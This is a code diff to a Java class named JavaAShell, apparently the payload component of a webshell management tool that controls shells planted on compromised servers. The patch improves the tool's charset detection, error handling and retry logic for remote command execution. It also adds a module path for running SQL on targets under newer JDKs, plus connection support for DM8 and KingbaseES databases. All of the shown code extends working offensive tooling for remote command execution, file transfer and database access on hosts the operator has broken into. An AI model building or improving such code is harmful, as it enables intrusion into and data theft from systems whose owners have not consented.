@@ -124,6 +124,19 @@ public class JavaAShell extends AbstractPayload {
             this.basicsInfo = this.encoding.Decoding(this.evalFunc((String)null, "getBasicsInfo", parameter));
         }
 
+        // Every target-side module decodes parameters with new String(bytes), i.e.
+        // Charset.defaultCharset(), i.e. file.encoding. BasicInfoModule dumps all
+        // system properties, so the answer is right here -- no extra probe needed.
+        // Data-driven rather than payload-typed: a target that does not report the
+        // line simply keeps the previous behaviour.
+        if (this.encoding != null) {
+            HashMap<String, String> encMap = functions.matcherTwoChild(this.basicsInfo, "(file\\.encoding) : (.+)");
+            String remoteCharset = (String) encMap.get("file.encoding");
+            if (remoteCharset != null && remoteCharset.trim().length() > 0) {
+                this.encoding.setRemoteCharset(remoteCharset.trim());
+            }
+        }
+
         Map<String, String> pxMap = functions.matcherTwoChild(this.basicsInfo, "(FileRoot|CurrentDir|OsInfo|CurrentUser|ProcessArch|TempDirectory|RealFile) : (.+)");
         this.fileRoot = (String)pxMap.get("FileRoot");
         this.currentDir = (String)pxMap.get("CurrentDir");
@@ -143,6 +156,12 @@ public class JavaAShell extends AbstractPayload {
             parameters.add("codeName", codeName);
             parameters.add("binCode", binCode);
             byte[] result = this.evalFunc((String)null, "include", parameters);
+            if (result == null) {
+                // evalFunc 在目标端响应解不开时返回 null；直接 new String(null) 会 NPE，
+                // 调用方只看到一个莫名其妙的 NullPointerException。
+                Log.error(EasyI18N.getI18nString("include 未获得可解码响应") + ": " + codeName);
+                return false;
+            }
             String resultString = (new String(result)).trim();
             if (resultString.equals("ok")) {
                 return true;
@@ -221,7 +240,7 @@ public class JavaAShell extends AbstractPayload {
             byte[] data = parameter.formatEx();
             data = functions.gzipE(data);
             byte[] result = null;
-            int maxErrRetryTmp = this.maxErrRetry == 0 ? 1 : (this.maxErrRetry > 0 ? this.maxErrRetry : 1);
+            int maxErrRetryTmp = this.retryCountFor(funcName);
 
             for(int i = 0; i < maxErrRetryTmp; ++i) {
                 try {
@@ -238,6 +257,16 @@ public class JavaAShell extends AbstractPayload {
             parameter.remove("sessionId");
             return result;
         }
+    }
+
+    private int retryCountFor(String funcName) {
+        if (funcName != null) {
+            String name = funcName.trim();
+            if ("execCommand".equalsIgnoreCase(name)) {
+                return 1;
+            }
+        }
+        return this.maxErrRetry == 0 ? 1 : (this.maxErrRetry > 0 ? this.maxErrRetry : 1);
     }
 
     public boolean uploadFile(String fileName, byte[] data) {
@@ -537,6 +566,16 @@ public class JavaAShell extends AbstractPayload {
             case "sqlite":
                 jdbcURL = "jdbc:sqlite:{databaseHost}";
                 break;
+            case "dm":
+                // 官方格式: jdbc:dm://<host>:<port>[/<database>]，默认端口 5236
+                jdbcURL = "jdbc:dm://{databaseHost}:{databasePort}";
+                if (currentDatabase != null && !currentDatabase.isEmpty()) {
+                    jdbcURL = jdbcURL + "/" + currentDatabase;
+                }
+                break;
+            case "kingbase":
+                jdbcURL = "jdbc:kingbase8://{databaseHost}:{databasePort}/{currentDatabase}";
+                break;
             default:
                 jdbcURL = "jdbc:customDriver://{databaseHost}:{databasePort}/";
         }
@@ -545,7 +584,24 @@ public class JavaAShell extends AbstractPayload {
         return jdbcURL;
     }
 
+    /** 数据库连接编码不支持 "Auto"（现在是 shell 的默认值）：回退成 shell 已解析出的实际编码。 */
+    private void resolveDbCharsetIfAuto(DbInfo dbInfo) {
+        if (dbInfo == null) {
+            return;
+        }
+        String cs = dbInfo.getDatabaseCharset();
+        if (cs != null && !cs.trim().isEmpty() && !"auto".equalsIgnoreCase(cs.trim())) {
+            return;
+        }
+        String resolved = this.encoding == null ? null : this.encoding.getCharsetString();
+        if (resolved == null || resolved.trim().isEmpty() || "auto".equalsIgnoreCase(resolved.trim())) {
+            resolved = "UTF-8";
+        }
+        dbInfo.setDatabaseCharset(resolved);
+    }
+
     public GDatabaseResult execSql(DbInfo dbInfo, String execType, String execSql) {
+        resolveDbCharsetIfAuto(dbInfo);
         Encoding dbEncoding = dbInfo.getDatabaseCharset2();
         String jdbcURL = dbInfo.getConnectionString();
         if (jdbcURL.isEmpty()) {
@@ -635,17 +691,25 @@ public class JavaAShell extends AbstractPayload {
         MODULE_CLASS_FILE_BY_METHOD.put("bigFileUpload", "BigFileUploadModule.class");
         MODULE_CLASS_FILE_BY_METHOD.put("bigFileDownload", "BigFileDownloadModule.class");
         MODULE_CLASS_FILE_BY_METHOD.put("execCommand", "CommandExecModule.class");
+        // Without this, evalFunc(null, "execSql", ...) sent no payloadBytes and the
+        // target fell through to payload.execSql(), whose DriverManager reflection
+        // is blocked on JDK 16+. ExecSqlModule resolves drivers through public APIs.
+        MODULE_CLASS_FILE_BY_METHOD.put("execSql", "ExecSqlModule.class");
         LinkedList<String> mysqlDrives = new LinkedList();
         LinkedList<String> oracleDrives = new LinkedList();
         LinkedList<String> sqlserverDrives = new LinkedList();
         LinkedList<String> postgresqlDrives = new LinkedList();
         LinkedList<String> sqliteDrives = new LinkedList();
+        LinkedList<String> dmDrives = new LinkedList();
+        LinkedList<String> kingbaseDrives = new LinkedList();
         LinkedList<String> customDrives = new LinkedList();
         ALL_DATABASE_TYPE.put("mysql", mysqlDrives);
         ALL_DATABASE_TYPE.put("oracle", oracleDrives);
         ALL_DATABASE_TYPE.put("sqlserver", sqlserverDrives);
         ALL_DATABASE_TYPE.put("postgresql", postgresqlDrives);
         ALL_DATABASE_TYPE.put("sqlite", sqliteDrives);
+        ALL_DATABASE_TYPE.put("dm", dmDrives);
+        ALL_DATABASE_TYPE.put("kingbase", kingbaseDrives);
         ALL_DATABASE_TYPE.put("custom", customDrives);
         mysqlDrives.add("com.mysql.jdbc.Driver");
         mysqlDrives.add("com.mysql.cj.jdbc.Driver");
@@ -654,6 +718,11 @@ public class JavaAShell extends AbstractPayload {
         sqlserverDrives.add("com.microsoft.sqlserver.jdbc.SQLServerDriver");
         postgresqlDrives.add("org.postgresql.Driver");
         sqliteDrives.add("org.sqlite.JDBC");
+        // 达梦 DM8（Oracle 兼容）/ 人大金仓 KingbaseES V8（PostgreSQL 兼容）
+        dmDrives.add("dm.jdbc.driver.DmDriver");
+        dmDrives.add("dm.jdbc.driver.DmdbDriver");
+        kingbaseDrives.add("com.kingbase8.Driver");
+        kingbaseDrives.add("com.kingbase.Driver");
         customDrives.add("my.sql.Driver");
     }
 }
